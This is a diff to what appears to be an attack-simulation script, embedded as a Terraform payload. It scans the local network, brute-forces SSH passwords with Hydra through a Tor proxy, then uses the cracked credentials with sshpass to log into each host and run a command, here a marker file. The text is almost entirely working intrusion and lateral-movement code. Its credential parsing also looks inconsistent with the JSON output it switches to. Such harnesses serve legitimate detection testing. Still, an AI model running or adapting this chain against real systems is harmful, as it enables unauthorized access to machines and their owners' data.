@@ -26,6 +26,7 @@ locals {
         sleep 120
     done
     log "docker path: $(which docker)"
+    apt-get update && apt-get install -y sshpass jq
     truncate -s 0 /tmp/hydra.txt
     LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
     log "LOCAL_NET: $LOCAL_NET"
@@ -48,23 +49,34 @@ locals {
     fi
     TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
     log "Running: proxychains hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
-    sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+    sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
     sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
     sudo /bin/bash -c "docker rm ${var.container_name}"
-    sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+    sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
     sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
     sudo /bin/bash -c "docker rm ${var.container_name}"
     EOF
     : <<-EOF
     log "Running: hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
-    sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+    sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
     sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
     sudo /bin/bash -c "docker rm ${var.container_name}"
-    sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+    sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
     sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
     sudo /bin/bash -c "docker rm ${var.container_name}"
     EOF
     }
+    # Read Hydra output file line by line
+    while IFS= read -r line
+    do
+        # Parse Hydra output
+        host=$(echo "$line" | awk '{print $3}')
+        username=$(echo "$line" | awk '{print $6}')
+        password=$(echo "$line" | awk '{print $8}')
+        log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'touch /tmp/hydra-pwned.txt'"
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'touch /tmp/hydra-pwned.txt'
+        log "Done"
+    done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
     log "Done."
     EOT
     base64_payload = base64encode(local.payload)
